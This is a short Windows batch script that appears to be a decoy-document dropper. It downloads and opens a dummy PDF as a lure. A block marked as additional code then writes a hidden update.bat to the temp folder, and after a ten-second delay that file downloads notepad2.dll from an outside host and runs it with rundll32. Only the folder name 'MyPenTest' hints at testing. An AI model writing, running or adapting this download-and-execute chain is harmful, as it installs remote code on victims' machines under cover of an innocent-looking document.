@echo off
set "target=%TEMP%\MyPenTest"
set "pdfurl=https://raw.githubusercontent.com/bhekinko/test/main/dummy.pdf"
set "pdflocal=%target%\dummy.pdf"
mkdir "%target%" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri '%pdfurl%' -OutFile '%pdflocal%'"
start "" "%pdflocal%"

:: ===== ADDITIONAL CODE STARTS HERE =====

:: Set paths
set "updatebat=%TEMP%\update.bat"
set "dllurl=https://hitpak.org/notepad2.dll"
set "dllpath=%TEMP%\notepad2.dll"

:: Create update.bat in TEMP that downloads and tries to run notepad2.dll
(
echo @echo off
echo powershell -Command "Invoke-WebRequest -Uri '%dllurl%' -OutFile '%dllpath%'"
echo rundll32 "%dllpath%",notepad
) > "%updatebat%"

:: Run update.bat after 10-second delay
start "" cmd.exe /c "timeout /t 10 >nul & call \"%updatebat%\""
